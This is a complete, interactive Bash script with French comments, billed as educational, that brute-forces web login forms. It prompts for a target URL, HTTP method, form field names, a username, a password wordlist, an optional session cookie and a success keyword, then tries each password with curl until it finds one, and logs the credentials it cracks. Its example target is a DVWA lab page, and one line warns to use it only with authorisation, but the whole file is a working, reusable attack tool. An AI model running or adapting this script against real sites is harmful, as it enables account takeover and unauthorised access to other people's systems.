#!/bin/bash

# ============================================================================
#  SCRIPT DE BRUTE-FORCE HTTP - VERSION ÉDUCATIVE
# ============================================================================
#  Ce script permet de tester des mots de passe sur un formulaire web
#  Usage: ./http_bruteforce.sh
# ============================================================================

# Couleurs pour l'affichage
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Fonction pour afficher un titre
print_title() {
    echo ""
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
}

# Fonction pour afficher une explication
print_info() {
    echo -e "${BLUE}ℹ️  INFO:${NC} $1"
}

# Fonction pour afficher un succès
print_success() {
    echo -e "${GREEN}✓ SUCCÈS:${NC} $1"
}

# Fonction pour afficher une erreur
print_error() {
    echo -e "${RED}✗ ERREUR:${NC} $1"
}

# Banner
clear
echo -e "${CYAN}"
cat << "BANNER"
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║                 HTTP BRUTE-FORCE                      ║
║                Version 1.0 - 2025                     ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
BANNER
echo -e "${NC}"

print_info "Cet outil permet de tester des mots de passe sur un formulaire web"
print_info "À utiliser UNIQUEMENT sur des systèmes dont vous avez l'autorisation"
echo ""

# ============================================================================
# ÉTAPE 1 : Configuration de la cible
# ============================================================================
print_title "ÉTAPE 1/6 : CONFIGURATION DE LA CIBLE"

print_info "L'URL complète est l'adresse de la page contenant le formulaire de login"
print_info "Exemple: http://172.30.0.10/vulnerabilities/brute/"
echo ""
read -p "$(echo -e ${YELLOW}Entrez l\'URL complète de la cible:${NC} )" TARGET_URL

# Validation de l'URL
if [[ ! $TARGET_URL =~ ^https?:// ]]; then
    print_error "L'URL doit commencer par http:// ou https://"
    exit 1
fi

print_success "URL cible: $TARGET_URL"

# ============================================================================
# ÉTAPE 2 : Méthode HTTP
# ============================================================================
print_title "ÉTAPE 2/6 : MÉTHODE HTTP"

print_info "La méthode HTTP détermine comment les données sont envoyées:"
print_info "  • GET  : Paramètres dans l'URL (visible dans la barre d'adresse)"
print_info "  • POST : Paramètres dans le corps de la requête (invisible)"
echo ""
print_info "Astuce: Ouvre les DevTools (F12) → Network et regarde la méthode"
echo ""
read -p "$(echo -e ${YELLOW}Méthode HTTP [GET/POST]:${NC} )" HTTP_METHOD
HTTP_METHOD=${HTTP_METHOD^^}  # Convertit en majuscules

if [[ "$HTTP_METHOD" != "GET" && "$HTTP_METHOD" != "POST" ]]; then
    print_error "Méthode invalide. Utilisez GET ou POST"
    exit 1
fi

print_success "Méthode: $HTTP_METHOD"

# ============================================================================
# ÉTAPE 3 : Paramètres du formulaire
# ============================================================================
print_title "ÉTAPE 3/6 : PARAMÈTRES DU FORMULAIRE"

print_info "Les paramètres sont les noms des champs du formulaire"
print_info "Pour les trouver: Inspecter le code HTML du formulaire"
print_info "    Exemple: <input name='username'> → paramètre = 'username'"
echo ""

read -p "$(echo -e ${YELLOW}Nom du paramètre USERNAME:${NC} )" PARAM_USER
print_success "Paramètre username: $PARAM_USER"

read -p "$(echo -e ${YELLOW}Nom du paramètre PASSWORD:${NC} )" PARAM_PASS
print_success "Paramètre password: $PARAM_PASS"

echo ""
print_info "Y a-t-il d'autres paramètres à envoyer? (ex: Login=Login, submit=1)"
read -p "$(echo -e ${YELLOW}Paramètres supplémentaires [ENTER pour aucun]:${NC} )" EXTRA_PARAMS

# ============================================================================
# ÉTAPE 4 : Identifiants
# ============================================================================
print_title "ÉTAPE 4/6 : IDENTIFIANTS À TESTER"

read -p "$(echo -e ${YELLOW}Nom d\'utilisateur à tester:${NC} )" USERNAME
print_success "Username: $USERNAME"

read -p "$(echo -e ${YELLOW}Chemin vers la wordlist de mots de passe:${NC} )" WORDLIST

# Validation de la wordlist
if [[ ! -f "$WORDLIST" ]]; then
    print_error "Le fichier $WORDLIST n'existe pas"
    exit 1
fi

TOTAL_PASSWORDS=$(wc -l < "$WORDLIST")
print_success "Wordlist chargée: $TOTAL_PASSWORDS mots de passe"

# ============================================================================
# ÉTAPE 5 : Authentification (Cookie/Token)
# ============================================================================
print_title "ÉTAPE 5/6 : AUTHENTIFICATION (optionnel)"

print_info "Si la page nécessite une authentification préalable (cookie de session):"
print_info "  • Connecte-toi dans le navigateur"
print_info "  • F12 → Application → Cookies"
print_info "  • Copie la valeur du cookie de session"
echo ""
print_info "Exemple: security=low; PHPSESSID=abc123xyz"
echo ""
read -p "$(echo -e ${YELLOW}Cookie de session [ENTER pour aucun]:${NC} )" SESSION_COOKIE

if [[ -n "$SESSION_COOKIE" ]]; then
    print_success "Cookie configuré"
else
    print_info "Aucun cookie (attaque sans authentification préalable)"
fi

# ============================================================================
# ÉTAPE 6 : Détection du succès
# ============================================================================
print_title "ÉTAPE 6/6 : DÉTECTION DU SUCCÈS"

print_info "Comment détecter qu'un mot de passe est correct?"
print_info "  1. Mot-clé présent en cas d'ÉCHEC (ex: 'incorrect', 'failed')"
print_info "  2. Mot-clé présent en cas de SUCCÈS (ex: 'Welcome', 'Dashboard')"
echo ""
read -p "$(echo -e ${YELLOW}Mode de détection [1=échec / 2=succès]:${NC} )" DETECTION_MODE

if [[ "$DETECTION_MODE" == "1" ]]; then
    read -p "$(echo -e ${YELLOW}Mot-clé en cas d\'échec:${NC} )" FAILURE_STRING
    print_success "Détection: Absence de '$FAILURE_STRING' = succès"
elif [[ "$DETECTION_MODE" == "2" ]]; then
    read -p "$(echo -e ${YELLOW}Mot-clé en cas de succès:${NC} )" SUCCESS_STRING
    print_success "Détection: Présence de '$SUCCESS_STRING' = succès"
else
    print_error "Mode invalide"
    exit 1
fi

# ============================================================================
# RÉCAPITULATIF ET CONFIRMATION
# ============================================================================
print_title "RÉCAPITULATIF DE LA CONFIGURATION"

echo -e "${CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
echo -e "${CYAN}┃${NC} URL cible      : $TARGET_URL"
echo -e "${CYAN}┃${NC} Méthode HTTP   : $HTTP_METHOD"
echo -e "${CYAN}┃${NC} Param username : $PARAM_USER"
echo -e "${CYAN}┃${NC} Param password : $PARAM_PASS"
echo -e "${CYAN}┃${NC} Paramètres +   : $EXTRA_PARAMS"
echo -e "${CYAN}┃${NC} Username       : $USERNAME"
echo -e "${CYAN}┃${NC} Wordlist       : $WORDLIST ($TOTAL_PASSWORDS mots de passe)"
if [[ -n "$SESSION_COOKIE" ]]; then
echo -e "${CYAN}┃${NC} Cookie         : ${SESSION_COOKIE:0:40}..."
fi
if [[ "$DETECTION_MODE" == "1" ]]; then
echo -e "${CYAN}┃${NC} Détection      : Absence de '$FAILURE_STRING'"
else
echo -e "${CYAN}┃${NC} Détection      : Présence de '$SUCCESS_STRING'"
fi
echo -e "${CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
echo ""

read -p "$(echo -e ${YELLOW}Lancer l\'attaque? [Y/n]:${NC} )" CONFIRM
CONFIRM=${CONFIRM:-Y}

if [[ ! "$CONFIRM" =~ ^[Yy] ]]; then
    print_error "Attaque annulée"
    exit 0
fi

# ============================================================================
# LANCEMENT DE L'ATTAQUE
# ============================================================================
print_title "ATTAQUE EN COURS"

print_info "Début de l'attaque: $(date)"
print_info "Appuyez sur Ctrl+C pour arrêter"
echo ""

# Fichier de log
LOGFILE="/workspace/bruteforce_$(date +%Y%m%d_%H%M%S).log"
echo "=== BRUTE-FORCE LOG ===" > "$LOGFILE"
echo "URL: $TARGET_URL" >> "$LOGFILE"
echo "Username: $USERNAME" >> "$LOGFILE"
echo "Date: $(date)" >> "$LOGFILE"
echo "" >> "$LOGFILE"

# Compteurs
TESTED=0
START_TIME=$(date +%s)

# Boucle principale
while IFS= read -r password; do
    ((TESTED++))
    
    # Affichage de la progression
    echo -ne "\r${YELLOW}[${TESTED}/${TOTAL_PASSWORDS}]${NC} Test: ${password:0:30}$(printf '%-20s' '')                "
    
    # Construction de la requête selon la méthode
    if [[ "$HTTP_METHOD" == "GET" ]]; then
        # Requête GET
        if [[ -n "$EXTRA_PARAMS" ]]; then
            FULL_URL="${TARGET_URL}?${PARAM_USER}=${USERNAME}&${PARAM_PASS}=${password}&${EXTRA_PARAMS}"
        else
            FULL_URL="${TARGET_URL}?${PARAM_USER}=${USERNAME}&${PARAM_PASS}=${password}"
        fi
        
        if [[ -n "$SESSION_COOKIE" ]]; then
            response=$(curl -s -G "$FULL_URL" -H "Cookie: $SESSION_COOKIE")
        else
            response=$(curl -s -G "$FULL_URL")
        fi
    else
        # Requête POST
        if [[ -n "$EXTRA_PARAMS" ]]; then
            DATA="${PARAM_USER}=${USERNAME}&${PARAM_PASS}=${password}&${EXTRA_PARAMS}"
        else
            DATA="${PARAM_USER}=${USERNAME}&${PARAM_PASS}=${password}"
        fi
        
        if [[ -n "$SESSION_COOKIE" ]]; then
            response=$(curl -s -X POST "$TARGET_URL" -d "$DATA" -H "Cookie: $SESSION_COOKIE")
        else
            response=$(curl -s -X POST "$TARGET_URL" -d "$DATA")
        fi
    fi
    
    # Vérification du succès
    SUCCESS=false
    if [[ "$DETECTION_MODE" == "1" ]]; then
        # Détection par absence du mot-clé d'échec
        if ! echo "$response" | grep -q "$FAILURE_STRING"; then
            SUCCESS=true
        fi
    else
        # Détection par présence du mot-clé de succès
        if echo "$response" | grep -q "$SUCCESS_STRING"; then
            SUCCESS=true
        fi
    fi
    
    # Si succès trouvé
    if [[ "$SUCCESS" == true ]]; then
        END_TIME=$(date +%s)
        DURATION=$((END_TIME - START_TIME))
        
        echo -e "\n"
        echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${GREEN}           MOT DE PASSE TROUVÉ${NC}"
        echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo ""
        echo -e "${CYAN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${NC}"
        echo -e "${CYAN}┃${NC} Username  : ${GREEN}$USERNAME${NC}"
        echo -e "${CYAN}┃${NC} Password  : ${GREEN}$password${NC}"
        echo -e "${CYAN}┃${NC} Tentatives: $TESTED"
        echo -e "${CYAN}┃${NC} Durée     : ${DURATION}s"
        echo -e "${CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
        echo ""
        
        # Sauvegarde dans le log
        echo "✓ SUCCESS: $USERNAME:$password" >> "$LOGFILE"
        echo "Tentatives: $TESTED" >> "$LOGFILE"
        echo "Durée: ${DURATION}s" >> "$LOGFILE"
        
        print_success "Résultats sauvegardés dans: $LOGFILE"
        exit 0
    fi
    
    # Log des tentatives échouées (optionnel)
    # echo "✗ $password" >> "$LOGFILE"
    
done < "$WORDLIST"

# Si aucun mot de passe trouvé
echo -e "\n"
END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

print_error "Aucun mot de passe trouvé après $TESTED tentatives (${DURATION}s)"
echo "✗ Aucun succès" >> "$LOGFILE"

exit 1